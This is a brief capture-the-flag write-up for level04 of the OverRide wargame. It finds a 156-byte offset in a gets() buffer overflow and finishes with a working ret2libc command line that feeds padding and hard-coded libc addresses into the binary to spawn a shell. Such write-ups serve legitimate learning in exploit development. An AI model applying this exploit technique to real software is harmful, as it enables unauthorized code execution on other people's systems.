# level04

## using gdb (unnecessary)
follow the child process in gdb:
```
set follow-fork-mode child
```

## the code
A buffer of size 128 seams eager to overflow with data provided by a gets method.
But...
The code hang up the process instead of segfault. With gdb it hand up after the gets for an unknown reason.
But...
Honestly we don't care!


## offset
search for the offset by dichotomy
```sh
level04@OverRide:~$ (python -c 'print("A" * 156)') | ./level04 
Give me some shellcode, k
Give me some shellcode, k
```
offset is 156

## ret2libc
We reuse the addresses found in level01
(python -c 'print("A" * 156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7")'; cat) | ./level04